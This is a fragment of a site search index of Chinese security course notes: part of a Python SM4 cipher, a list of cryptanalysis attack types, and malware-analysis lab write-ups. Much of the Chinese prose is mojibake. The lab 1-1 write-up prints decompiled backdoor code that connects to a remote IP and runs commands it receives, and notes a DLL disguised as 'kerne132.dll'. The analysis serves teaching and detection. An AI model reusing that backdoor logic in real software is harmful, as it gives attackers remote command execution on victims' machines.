0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,  0x30373e45,0x4c535a61,0x686f767d,0x848b9299,  0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,  0x10171e25,0x2c333a41,0x484f565d,0x646b7279 ]  SM4_ENCRYPT = 0 SM4_DECRYPT = 1   class CryptSM4(object):   def __init__(self, mode=SM4_ENCRYPT):  self.sk = [0]*32  self.mode = mode  # Calculating round encryption key.  # args: [in] a: a is a 32 bits unsigned value;  # return: sk[i]: i{0,1,2,3,...31}.  @classmethod  def _round_key(cls, ka):  b = [0, 0, 0, 0]  a = put_uint32_be(ka)  b[0] = SM4_BOXES_TABLE[a[0]]  b[1] = SM4_BOXES_TABLE[a[1]]  b[2] = SM4_BOXES_TABLE[a[2]]  b[3] = SM4_BOXES_TABLE[a[3]]  bb = get_uint32_be(b[0:4])  rk = bb ^ (rotl(bb, 13)) ^ (rotl(bb, 23))  return rk   # Calculating and getting encryption/decryption contents.  # args: [in] x0: original contents;  # args: [in] x1: original contents;  # args: [in] x2: original contents;  # args: [in] x3: original contents;  # args: [in] rk: encryption/decryption key;  # return the contents of encryption/decryption contents.  @classmethod  def _f(cls, x0, x1, x2, x3, rk):  # \u0026#34;T algorithm\u0026#34; == \u0026#34;L algorithm\u0026#34; + \u0026#34;t algorithm\u0026#34;.  # args: [in] a: a is a 32 bits unsigned value;  # return: c: c is calculated with line algorithm \u0026#34;L\u0026#34; and nonline algorithm \u0026#34;t\u0026#34;  def _sm4_l_t(ka):  b = [0, 0, 0, 0]  a = put_uint32_be(ka)  b[0] = SM4_BOXES_TABLE[a[0]]  b[1] = SM4_BOXES_TABLE[a[1]]  b[2] = SM4_BOXES_TABLE[a[2]]  b[3] = SM4_BOXES_TABLE[a[3]]  bb = get_uint32_be(b[0:4])  c = bb ^ (rotl(bb, 2)) ^ (rotl(bb, 10)) ^ (rotl(bb, 18)) ^ (rotl(bb, 24))  return c  return (x0 ^ _sm4_l_t(x1 ^ x2 ^ x3 ^ rk))   def set_key(self, key, mode):  key = bytes_to_list(key)  MK = [0, 0, 0, 0]  k = [0]*36  MK[0] = get_uint32_be(key[0:4])  MK[1] = get_uint32_be(key[4:8])  MK[2] = get_uint32_be(key[8:12])  MK[3] = get_uint32_be(key[12:16])  k[0:4] = xor(MK[0:4], SM4_FK[0:4])  for i in range(32):  k[i + 4] = k[i] ^ (  self._round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i]))  self.sk[i] = k[i + 4]  self.mode = mode  if mode == SM4_DECRYPT:  for idx in range(16):  t = self.sk[idx]  self.sk[idx] = self.sk[31 - idx]  self.sk[31 - idx] = t   def one_round(self, sk, in_put):  out_put = []  ulbuf = [0]*36  ulbuf[0] = get_uint32_be(in_put[0:4])  ulbuf[1] = get_uint32_be(in_put[4:8])  ulbuf[2] = get_uint32_be(in_put[8:12])  ulbuf[3] = get_uint32_be(in_put[12:16])  for idx in range(32):  ulbuf[idx + 4] = self._f(ulbuf[idx], ulbuf[idx + 1], ulbuf[idx + 2], ulbuf[idx + 3], sk[idx])   out_put += put_uint32_be(ulbuf[35])  out_put += put_uint32_be(ulbuf[34])  out_put += put_uint32_be(ulbuf[33])  out_put += put_uint32_be(ulbuf[32])  return out_put   def crypt_ecb(self, input_data):  # SM4-ECB block encryption/decryption  input_data = bytes_to_list(input_data)  if self.mode == SM4_ENCRYPT:  input_data = padding(input_data)  length = len(input_data)  i = 0  output_data = []  while length \u0026gt; 0:  output_data += self.one_round(self.sk, input_data[i:i+16])  i += 16  length -= 16  if self.mode == SM4_DECRYPT:  return list_to_bytes(unpadding(output_data))  return list_to_bytes(output_data)   def crypt_cbc(self, iv, input_data):  #SM4-CBC buffer encryption/decryption  i = 0  output_data = []  tmp_input = [0]*16  iv = bytes_to_list(iv)  if self.mode == SM4_ENCRYPT:  input_data = padding(bytes_to_list(input_data))  length = len(input_data)  while length \u0026gt; 0:  tmp_input[0:16] = xor(input_data[i:i+16], iv[0:16])  output_data += self.one_round(self.sk, tmp_input[0:16])  iv = copy.deepcopy(output_data[i:i+16])  i += 16  length -= 16  return list_to_bytes(output_data)  else:  length = len(input_data)  while length \u0026gt; 0:  output_data += self.one_round(self.sk, input_data[i:i+16])  output_data[i:i+16] = xor(output_data[i:i+16], iv[0:16])  iv = copy.deepcopy(input_data[i:i + 16])  i += 16  length -= 16  return list_to_bytes(unpadding(output_data)) "},{"id":264,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","title":"æ”»å‡»æ–¹æ³•","section":"å¯†ç å­¦","content":"README #  è¿™é‡Œæˆ‘ä»¬æ ¹æ®æ”»å‡»è€…è·å–å¯†ç å­¦ç³»ç»Ÿçš„ä¿¡æ¯çš„å¤šå°‘å°†æ”»å‡»æ¨¡å¼åˆ†ä¸ºä»¥ä¸‹å‡ ç±»\n å”¯å¯†æ–‡æ”»å‡»ï¼šæ”»å‡»è€…ä»…èƒ½è·å¾—ä¸€äº›åŠ å¯†è¿‡çš„å¯†æ–‡ã€‚ å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼šæ”»å‡»è€…æœ‰ä¸€äº›å¯†æ–‡å¯¹åº”çš„æ˜æ–‡ã€‚ é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼šæ”»å‡»è€…åœ¨å¼€å§‹æ”»å‡»æ—¶å¯ä»¥é€‰æ‹©ä¸€äº›æ˜æ–‡ï¼Œå¹¶è·å–åŠ å¯†åçš„å¯†æ–‡ã€‚å¦‚æœæ”»å‡»è€…åœ¨æ”»å‡»ä¸­é€”å¯ä»¥æ ¹æ®å·²ç»è·å–çš„ä¿¡æ¯é€‰æ‹©æ–°çš„æ˜æ–‡å¹¶è·å–å¯¹åº”çš„å¯†æ–‡ï¼Œåˆ™ç§°ä¸ºé€‚åº”æ€§é€‰æ‹©æ˜æ–‡æ”»å‡»ã€‚ é€‰æ‹©å¯†æ–‡æ”»å‡»ï¼šæ”»å‡»è€…åœ¨å¼€å§‹æ”»å‡»ä¹‹å‰å¯ä»¥é€‰æ‹©ä¸€äº›å¯†æ–‡ï¼Œå¹¶è·å–è§£å¯†åçš„æ˜æ–‡ã€‚å¦‚æœæ”»å‡»è€…åœ¨æ”»å‡»å›¾ä¸­å¯ä»¥æ ¹æ®å·²ç»è·å–çš„ä¿¡æ¯é€‰æ‹©ä¸€äº›æ–°çš„å¯†æ–‡å¹¶è·å–å¯¹åº”çš„æ˜æ–‡ï¼Œåˆ™ç§°ä¸ºé€‚åº”æ€§é€‰æ‹©å¯†æ–‡æ”»å‡»ã€‚ ç›¸å…³å¯†é’¥æ”»å‡»ï¼šæ”»å‡»è€…å¯ä»¥è·å¾—ä¸¤ä¸ªæˆ–å¤šä¸ªç›¸å…³å¯†é’¥çš„åŠ å¯†æˆ–è§£å¯†åçš„å¯†æ–‡æˆ–æ˜æ–‡ã€‚ä½†æ˜¯æ”»å‡»è€…ä¸çŸ¥é“è¿™äº›å¯†é’¥ã€‚  æ ¹æ®ä¸åŒçš„æ”»å‡»æ¨¡å¼ï¼Œå¯èƒ½ä¼šæœ‰ä¸åŒçš„æ”»å‡»æ–¹æ³•ï¼Œç›®å‰å¸¸è§çš„æ”»å‡»æ–¹æ³•ä¸»è¦æœ‰\n æš´åŠ›æ”»å‡»ã€ä¸­é—´ç›¸é‡æ”»å‡»ã€çº¿æ€§åˆ†æã€å·®åˆ†åˆ†æã€ä¸å¯èƒ½å·®åˆ†åˆ†æã€ç§¯åˆ†åˆ†æã€ä»£æ•°åˆ†æã€ç›¸å…³å¯†é’¥æ”»å‡»ã€ä¾§ä¿¡é“æ”»å‡»  "},{"id":265,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-1/","title":"Lab1 1","section":"01","content":"lab 1-1 #  QUESTION 1 #   Upload the files to http://www.VirusTotal.com/ and view the reports. Does either file match any existing antivirus signatures?\n æ–‡ä»¶ä¸Šä¼ çš„ sha256 hash å€¼ä¸ºï¼š\n$ sha256sum Lab01-01.exe 58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47 Lab01-01.exe å› æ­¤ä¸Šä¼ çš„ url ä¸ºï¼šhttps://www.virustotal.com/#/file/58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47/detection\nå¯ä»¥çœ‹åˆ°è®¸å¤šç—…æ¯’å¼•æ“éƒ½æ£€æµ‹åˆ°è¿™æ˜¯ä¸€ä¸ªæœ¨é©¬ã€‚\nQUESTION 2 #   When were these files compiled?\n PE æ–‡ä»¶çš„æ–‡ä»¶ç»“æ„å¯ä»¥å‚è€ƒå¾®è½¯çš„å®˜æ–¹æ–‡æ¡£ã€‚\nå¯ä»¥æ‰¾åˆ°åœ¨å¯¹è±¡æ–‡ä»¶çš„çš„æœ€å¼€å§‹ï¼Œå­˜åœ¨ä¸€ä¸ªæ ‡å‡†æ–‡ä»¶å¤´ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ª TimeDateStamp åŸŸï¼ŒæŒ‡ç¤ºäº†æ–‡ä»¶åˆ›å»ºæ—¶çš„æ—¶é—´æˆ³ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„ python è„šæœ¬è¯»å–å®ƒï¼š\n# lab1-1-2.py from datetime import datetime import pefile  pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) print(datetime.fromtimestamp(pe.FILE_HEADER.TimeDateStamp)) $ python lab1-1-2.py 2010-12-20 00:16:19 QUESTION 3 #   Are there any indications that either of these files is packed or obfuscated? If so, what are these indicators?\n packerid #  å®‰è£… BlackArch çš„å·¥å…· packeridï¼š\n$ sudo pacman -S packerid è¿™æ˜¯ä¸€ä¸ªåŸºäºå­—èŠ‚ç ç‰¹å¾åŒ¹é…æ‰“åŒ…ç¨‹åºçš„å‘½ä»¤è¡Œå·¥å…·ã€‚\n  å­—èŠ‚ç ç‰¹å¾æˆ‘ä»¬ä½¿ç”¨ pefile è¿™ä¸ª python å¼€æºåº“ä¸­çš„æ•°æ®åº“ï¼šhttps://github.com/sooshie/packerid/blob/master/userdb.txt\nï¼ˆå¦å¤–æˆ‘åœ¨è¿è¡Œç¨‹åºæ—¶å‘ç°äº†ä¸€ä¸ªæŠ¥é”™ï¼ŒåŸå› æ˜¯å­—èŠ‚ç ç‰¹å¾ä¸­å‡ºç°äº† V3 è¿™ç±»çš„å­—èŠ‚ç ï¼Œæš‚æ—¶è¿˜ä¸æ¸…æ¥šè¿™ä¸ªå­—èŠ‚ç çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼‰\n  å­—èŠ‚ç æ–‡ä»¶ä¿å­˜åœ¨ /usr/share/packerid/userdb.txt æ–‡ä»¶å¤¹ä¸­\n  ç›´æ¥æŒ‡å®šæ–‡ä»¶è·¯å¾„æ¥åˆ†æ PE æ–‡ä»¶ï¼š\n$ packerid /tmp/BinaryCollection/Chapter_1L/Lab01-01.exe [\u0026#39;Microsoft Visual C++ v5.0/v6.0 (MFC)\u0026#39;] pefile #  é€šè¿‡ pefile ä¹Ÿå¯ä»¥é€šè¿‡ç‰¹å¾åŒ¹é…çš„æ–¹å¼è¯†åˆ« PE æ–‡ä»¶çš„æ‰“åŒ…æ–¹å¼ã€‚\nå…¶å®åœ¨ç¬¬ä¸€ç§æ–¹æ³•ä¸­ packerid çš„åº•å±‚å°±æ˜¯ä½¿ç”¨ pefile è¿™ä¸ª python çš„åº“ï¼Œç„¶åä½¿ç”¨å¼€æºçš„ç‰¹å¾åº“è¿›è¡ŒåŒ¹é…çš„ã€‚æ­¤å¤„å°±ä¸æ‰‹åŠ¨å®ç°äº†\nPEiD #  æˆ–è€…é€šè¿‡ PEiD è¿™ä¸ªè½¯ä»¶è¿›è¡Œåˆ†æï¼š\nç»“è®º #  å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ª VC++ MFC æ‰“åŒ…çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰åŠ å£³ã€‚\nQUESTION 4 #   Do any imports hint at what this malware does? If so, which imports are they?\n malscan #  å®‰è£… BlackArch çš„å·¥å…· malscanï¼š\n$ sudo pacman -S malscan malscan æ˜¯ä¸€ä¸ªå¯å‘å¼é™æ€åˆ†æå·¥å…·ï¼Œä½¿ç”¨ä¸€ä¸‹å‘½ä»¤æ£€æµ‹ï¼š\n$ malscan /tmp/BinaryCollection/Chapter_1L/Lab01-01.exe ... [Imports Overview]  KERNEL32.dll \t0x402000 CloseHandle \t0x402004 UnmapViewOfFile \t0x402008 IsBadReadPtr \t0x40200c MapViewOfFile \t0x402010 CreateFileMappingA \t0x402014 CreateFileA \t0x402018 FindClose \t0x40201c FindNextFileA \t0x402020 FindFirstFileA \t0x402024 CopyFileA  MSVCRT.dll \t0x40202c malloc \t0x402030 exit \t0x402034 _exit \t0x402038 _XcptFilter \t0x40203c __p___initenv \t0x402040 __getmainargs \t0x402044 _initterm \t0x402048 __setusermatherr \t0x40204c _adjust_fdiv \t0x402050 __p__commode \t0x402054 __p__fmode \t0x402058 __set_app_type \t0x40205c _except_handler3 \t0x402060 _controlfp \t0x402064 _stricmp ... pefile #  æˆ–è€…ä½¿ç”¨ pefile å…ˆè¯»å–æ‰€æœ‰çš„å¯¼å…¥å‡½æ•°ï¼Œç„¶åä¸€ä¸€æ‰“å°ï¼Œmalscan ä¹Ÿæ˜¯ä½¿ç”¨åŒæ ·çš„æ–¹å¼å®ç°çš„ï¼Œæ­¤å¤„å°±ä¸æ‰‹åŠ¨å®ç°äº†ã€‚\nPE Explorer #  æˆ–è€…ç›´æ¥ä½¿ç”¨ PE Explorer å¯ä»¥æŸ¥çœ‹ä»¥ä¸‹çš„å¯¼å…¥å‡½æ•°ç»“æœï¼š\né“¾æ¥åº“çš„å¯¼å…¥è¡¨åˆ†æï¼š\nç»“è®º #  ä»¥ä¸Šåˆ†æè¯´æ˜ lab01-01.exe è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸»è¦åŒ…å«äº†å¤åˆ¶å’ŒæŸ¥æ‰¾æ–‡ä»¶çš„æ“ä½œã€‚\nlab01-01.dll è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“å¼•ç”¨äº†æ–°å»ºè¿›ç¨‹ã€ç¡çœ ã€åˆ›å»º Mutex ç­‰å¤šä¸ªæœ‰å…³è¿›ç¨‹çš„æ“ä½œã€‚è¿˜å¯¼å…¥äº† WS2_32.dll è¿™ä¸ªä¸»è¦ç”¨ä¸ç½‘ç»œå¥—æ¥å­—å»ºç«‹çš„åŠ¨æ€é“¾æ¥åº“ã€‚\nQUESTION 5 #   Are there any other files or host-based indicators that you could look for on infected systems?\n ä»ä¹‹å‰çš„åŠ¨æ€é“¾æ¥åº“å¯¼å…¥å‡½æ•°åˆ†ææ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æä¸»æœºçš„ç½‘ç»œé“¾æ¥çŠ¶æ€æ¥åˆ†æä¸»æœºæ˜¯å¦æ„ŸæŸ“äº†æ­¤ç—…æ¯’ã€‚\nPE Explorer #  å¦å¤–æˆ‘ä»¬åˆ†æå¯æ‰§è¡Œæ–‡ä»¶çš„ .data å…¨å±€æ•°æ®æ®µï¼š\næˆ‘ä»¬å‘ç°ä¸€ä¸ªå«åš kerne132.dll çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ç”¨æ•°å­— 1 ä»£æ›¿äº†å­—æ¯ lï¼Œè²Œä¼¼æ˜¯æƒ³è¦æ©ç›–ä»€ä¹ˆä¸œè¥¿ã€‚æˆ‘ä»¬æŸ¥æ‰¾è°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²çš„ä½ç½®ï¼Œæˆ‘ä»¬å‘ç°ä¸‹é¢çš„æ±‡ç¼–æŒ‡ä»¤ï¼š\n... push\t00000000h\rpush\tSSZ0040304C_C__windows_system32_kerne132_dll\rpush\tSSZ0040307C_Lab01_01_dll\rcall\t[KERNEL32.dll!CopyFileA]\r... ç»“åˆå…¨å±€æ•°æ®æ®µä¸­çš„ Lab01-01.dll è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™ä¸€æ®µä»£ç å°†åŒæ–‡ä»¶å¤¹ä¸‹çš„ Lab01-01.dll è¿™ä¸ªé™æ€é“¾æ¥åº“å¤åˆ¶åˆ°äº† C:/Windows/System32/kerne132.dll è¿™ä¸ªæ–‡ä»¶ã€‚\npefile \u0026amp; capstone #  ä¹Ÿå¯ä»¥ç”¨ pefile é¦–å…ˆè¯»å–æ‰€æœ‰æ®µçš„åç§°å’Œå…¶ç›¸å¯¹åç§»åœ°å€ï¼š\n#!/usr/bin/env python import pefile  pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) print([(s.Name, hex(s.VirtualAddress)) for s in pe.sections]) # [(b\u0026#39;.text\\x00\\x00\\x00\u0026#39;, \u0026#39;0x1000\u0026#39;), (b\u0026#39;.rdata\\x00\\x00\u0026#39;, \u0026#39;0x2000\u0026#39;), (b\u0026#39;.data\\x00\\x00\\x00\u0026#39;, \u0026#39;0x3000\u0026#39;)] å¯ä»¥çœ‹åˆ° .data æ®µå­˜åœ¨ï¼Œå¹¶ä¸”å…¶ç›¸å¯¹è™šæ‹Ÿåœ°å€ä¸º 0x3000ã€‚ç„¶åæˆ‘ä»¬é€šè¿‡ä»¥ä¸‹çš„ç¨‹åºæ‰‹åŠ¨å¤„ç†å¹¶è¯»å– .data æ®µå†…çš„å†…å®¹ï¼š\n#!/usr/bin/env python import pefile  pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) data, string, offset = [], \u0026#34;\u0026#34;, 0 for index, item in enumerate(pe.sections[2].get_data()):  if item != 0:  string += chr(item)  elif string != \u0026#34;\u0026#34;:  data.append((string, hex(index)))  string = \u0026#34;\u0026#34; for d in data: print(d) # ... # (\u0026#39;C:\\\\windows\\\\system32\\\\kerne132.dll\u0026#39;, \u0026#39;0x4c\u0026#39;) # ... æˆ‘ä»¬åŒæ ·æ‰¾åˆ°äº†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ç›¸å¯¹åç§»åœ°å€ä¸º 0x4cï¼Œåˆå› ä¸º .data æ®µçš„è™šæ‹Ÿåœ°å€ä¸º 0x3000ï¼Œæ‰€æœ‰è¿™ä¸ªå­—ç¬¦ä¸²çš„è™šæ‹Ÿåœ°å€ä¸º 0x304cã€‚\nç„¶åæˆ‘ä»¬é€šè¿‡ capstone è¿™ä¸ªåº“åæ±‡ç¼– .text æ®µçš„å†…å®¹ï¼Œå¹¶æŸ¥æ‰¾å­—ç¬¦ä¸² 304c æ‰€åœ¨çš„æŒ‡ä»¤ä½ç½®ï¼š\n#!/usr/bin/env python import capstone import pefile  pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32) disas = cs.disasm(pe.sections[0].get_data(), pe.sections[0].VirtualAddress) call_poss, instructions = [], [] for index, ins in enumerate(disas):  instructions.append(ins)  if \u0026#34;304c\u0026#34; in ins.op_str:  call_poss.append(index) for ind, pos in enumerate(call_poss):  print(f\u0026#34;\\nCALLED POS {ind}==\u0026gt; {pos}\u0026#34;)  for ins in instructions[(pos-3 if (pos \u0026gt; 3) else 0):  (len(instructions) if (pos \u0026gt; len(instructions)-3) else pos+10)]:  print(f\u0026#34;{hex(ins.address)}:\\t{ins.mnemonic}\\t{ins.op_str}\u0026#34;) CALLED POS 0 ==\u0026gt; 749\r0x17e5: push edx\r0x17e6: call esi\r0x17e8: push 0\r0x17ea: push 0x40304c\r0x17ef: push 0x40307c\r0x17f4: call dword ptr [0x402024] é€šè¿‡ä¹‹å‰å¯¹é“¾æ¥åº“çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸º 0x402024 è¿™ä¸ªå‡½æ•°ï¼ˆå³ CopyFileAï¼‰çš„å‚æ•°è¿›è¡Œäº†è°ƒç”¨ã€‚\nç»“è®º #  ç»¼ä¸Šï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ C:/Windows/System32 è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹æ˜¯å¦å­˜åœ¨ kerne132.dll è¿™ä¸ªæ–‡ä»¶æ¥åˆ¤æ–­ä¸»æœºæ˜¯å¦è¢«æ„ŸæŸ“ã€‚\nQUESTION 6 #   What network-based indicators could be used to find this malware on infected machines?\n æ ¹æ®å‰é¢çš„åˆ†æï¼Œå¯æ‰§è¡Œæ–‡ä»¶é€šè¿‡å°†åŠ¨æ€é“¾æ¥åº“å¤åˆ¶åˆ° C:/Windows/System32 è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åé€šè¿‡è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“è¿›è¡Œè¿›ç¨‹ã€ç½‘ç»œç›¸å…³çš„åŠ¨ä½œï¼Œå› æ­¤æˆ‘ä»¬åˆ†æè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚.data æ®µå…¨å±€å­—ç¬¦ä¸²ï¼š\nå…¶ä¸­ exec å’Œä¸€ä¸ª 127.26.152.13 è¿™ä¸ªä¸º IP åœ°å€æ ¼å¼çš„å­—ç¬¦ä¸²éå¸¸å¯ç–‘ã€‚ä¸ºäº†åˆ†æè¯¥åŠ¨æ€é“¾æ¥åº“çš„ç½‘ç»œç‰¹å¾ï¼Œæˆ‘ä»¬æŸ¥æ‰¾è°ƒç”¨ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„ä½ç½® .text:100010A3ï¼Œä½¿ç”¨ IDA Pro åˆ†æå‡ºä»¥ä¸‹çš„ä¼ªä»£ç ï¼š\n//... v3 = socket(2, 1, 6); if ( v3 != -1 ) {  name.sa_family = 2;  *(_DWORD *)\u0026amp;name.sa_data[2] = inet_addr(cp);  *(_WORD *)name.sa_data = htons(0x50u);  if ( connect(v3, \u0026amp;name, 16) != -1 )  {  while ( send(v3, ::buf, strlen(::buf), 0) != -1 \u0026amp;\u0026amp; shutdown(v3, 1) != -1 )  {  if ( recv(v3, \u0026amp;buf, 4096, 0) \u0026gt; 0 )  {  if ( !strncmp(Str1, \u0026amp;buf, 5u) )  {  Sleep(0x60000u);  }  else if ( !strncmp(aExec, \u0026amp;buf, 4u) )  {  memset(\u0026amp;StartupInfo, 0, sizeof(StartupInfo));  StartupInfo.cb = 68;  CreateProcessA(0, \u0026amp;CommandLine, 0, 0, 1, 0x8000000u, 0, 0, \u0026amp;StartupInfo, \u0026amp;ProcessInformation);  }  else  {  if ( buf == 113 )  {  CloseHandle(hObject);  break;  }  Sleep(0x60000u);  }  }  }  }  closesocket(v3); } //... å…¶ä¸­ socket(2,1,6) è¿™è¡Œä»£ç ï¼Œé€šè¿‡æŸ¥æ‰¾ MSDN çš„ APIï¼Œæˆ‘ä»¬çŸ¥é“è¿™æ˜¯é€šè¿‡ä¸ 127.26.152.13 è¿™ä¸ªè¿œç¨‹åœ°å€ï¼Œ0x50 (80) è¿™ä¸ªç«¯å£ï¼Œå»ºç«‹ä¸€ä¸ª IPv4 çš„ TCP é“¾æ¥ã€‚å†åˆ†æä¸‹é¢çš„ä»£ç é€»è¾‘ï¼š\n å¦‚æœè¿œç¨‹å‘é€ sleep è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™çº¿ç¨‹ä¼‘çœ ï¼› å¦‚æœè¿œç¨‹å‘é€ exec è¿™ä¸ªå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œåˆ™çº¿ç¨‹ä¼šè°ƒç”¨å‘½ä»¤è¡Œæ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚è¿™ç›¸å½“äºç»™è¿œç¨‹åå¼¹äº†ä¸€ä¸ªç”¨äºä»»æ„å‘½ä»¤æ‰§è¡Œæƒé™çš„ shellï¼› å¦‚æœè¿œç¨‹å‘é€ acsii ç ä¸º 113 çš„å­—ç¬¦ï¼Œå³ qï¼Œåˆ™è¯¥å¥—æ¥å­—æ–­å¼€ï¼›  åœ¨ cmd ä¸­æ‰§è¡Œä»¥ä¸‹çš„å‘½ä»¤ï¼š\n$ netstat -p TCP -an | findstr 127.26.152.13 å¯ä»¥æŸ¥æ‰¾ä¸ä¸»æœº 127.26.152.13 è¿›å»ºç«‹çš„æ‰€æœ‰ TCP è¿æ¥ã€‚\nQUESTION 7 #   What would you guess is the purpose of these files?\n é€šè¿‡ä¹‹å‰çš„åˆ†æï¼Œè¿™ä¸ªç¨‹åºçš„é€»è¾‘å·²ç»ç›¸å½“æ¸…æ¥šäº†ã€‚\nå¯æ‰§è¡Œæ–‡ä»¶é€šè¿‡å°†åŒæ–‡ä»¶å¤¹ä¸‹çš„åŠ¨æ€é“¾æ¥åº“å¤åˆ¶åˆ° C:/Windows/System32 è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å¹¶å‘½åä¸º kern132.dllã€‚ä¸»ç¨‹åºè°ƒç”¨è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸è¿œç¨‹åœ°å€ 127.26.152.13 çš„ 80 ç«¯å£ä¸»åŠ¨å»ºç«‹ä¸€ä¸ª TCP é“¾æ¥ã€‚è¿œç¨‹å‘é€ä»¥ exec å¼€å¤´çš„å­—ç¬¦ä¸²æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå‘é€ q ç»“æŸè¿›ç¨‹ã€‚\n"},{"id":266,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-2/","title":"Lab1 2","section":"01","content":"lab 1-2 #  QUESTION 1 #   Upload the Lab01-02.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?\n æ–‡ä»¶çš„ sha256 å“ˆå¸Œå€¼ï¼š\n$ sha256sum Lab01-02.exe c876a332d7dd8da331cb8eee7ab7bf32752834d4b2b54eaa362674a2a48f64a6 Lab01-02.exe å› æ­¤ä¸Šä¼ çš„ url ä¸ºï¼šhttps://www.virustotal.com/#/file/c876a332d7dd8da331cb8eee7ab7bf32752834d4b2b54eaa362674a2a48f64a6/detection\nå¯ä»¥çœ‹åˆ°è¿™åŒæ ·æ˜¯ä¸€ä¸ªæœ¨é©¬ã€‚\nQUESTION 2 #   Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.\n ä½¿ç”¨ blackarch çš„å·¥å…· packerid æ¥æ£€æµ‹ç¬¬äºŒä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„å£³ï¼š\n$ packerid Lab01-02.exe [\u0026#39;UPX v0.89.6 - v1.02 / v1.05 -v1.24 -\u0026gt; Markus \u0026amp; Laszlo [overlay]\u0026#39;] å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªç”¨ UPX ç®€å•åŠ å£³çš„ç¨‹åºã€‚\næˆ‘ä»¬å®‰è£… upx è¿™ä¸ªç¨‹åºä¹‹åï¼Œç®€å•åœ°è„±å£³å³å¯ï¼š\n$ sudo pacman -S upx  $ upx -d Lab01-02.exe -o Lab01-02.unpack.exe  Ultimate Packer for eXecutables  Copyright (C) 1996 - 2018 UPX 3.95 Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Aug 26th 2018   File size Ratio Format Name  -------------------- ------ ----------- -----------  16384 \u0026lt;- 3072 18.75% win32/pe Lab01-02.unpack.exe  Unpacked 1 file.  $ packerid Lab01-02.unpack.exe [\u0026#39;Microsoft Visual C++ v5.0/v6.0 (MFC)\u0026#39;] å¯ä»¥çœ‹åˆ°æ‰“åŒ…ç¨‹åºæ˜¯ MFCï¼Œå› æ­¤æˆ‘ä»¬å°†è¿™ä¸ªç¨‹åºæˆåŠŸè„±å£³ã€‚\nQUESTION 3 #   Do any imports hint at this programâ€™s functionality? If so, which imports are they and what do they tell you?\n æˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨ blackarch ä¸‹çš„é™æ€åˆ†æå·¥å…· malscan åˆ†æå¯¼å…¥è¡¨ï¼š\n$ malscan /tmp/BinaryCollection/Chapter_1L/Lab01-02.unpack.exe ... KERNEL32.DLL \t0x402010 SystemTimeToFileTime \t0x402014 GetModuleFileNameA \t0x402018 CreateWaitableTimerA \t0x40201c ExitProcess \t0x402020 OpenMutexA \t0x402024 SetWaitableTimer \t0x402028 WaitForSingleObject \t0x40202c CreateMutexA \t0x402030 CreateThread  ADVAPI32.dll \t0x402000 CreateServiceA \t0x402004 StartServiceCtrlDispatcherA \t0x402008 OpenSCManagerA  MSVCRT.dll \t0x402038 _exit \t0x40203c _XcptFilter \t0x402040 exit \t0x402044 __p___initenv \t0x402048 __getmainargs \t0x40204c _initterm \t0x402050 __setusermatherr \t0x402054 _adjust_fdiv \t0x402058 __p__commode \t0x40205c __p__fmode \t0x402060 __set_app_type \t0x402064 _except_handler3 \t0x402068 